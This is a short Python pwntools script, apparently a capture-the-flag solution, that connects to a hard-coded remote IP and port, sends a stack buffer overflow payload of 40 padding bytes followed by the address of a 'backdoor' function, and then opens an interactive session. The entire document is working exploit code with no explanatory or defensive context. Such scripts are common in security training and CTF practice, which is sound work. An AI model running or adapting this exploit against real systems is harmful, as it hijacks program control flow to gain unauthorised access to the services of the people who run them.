from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = remote('124.16.75.116', 52011)

backdoor_addr = 0x00400676
offset = 32 + 8
payload = b'A' * offset + p64(backdoor_addr)

p.sendlineafter(b"input:", payload)
p.interactive()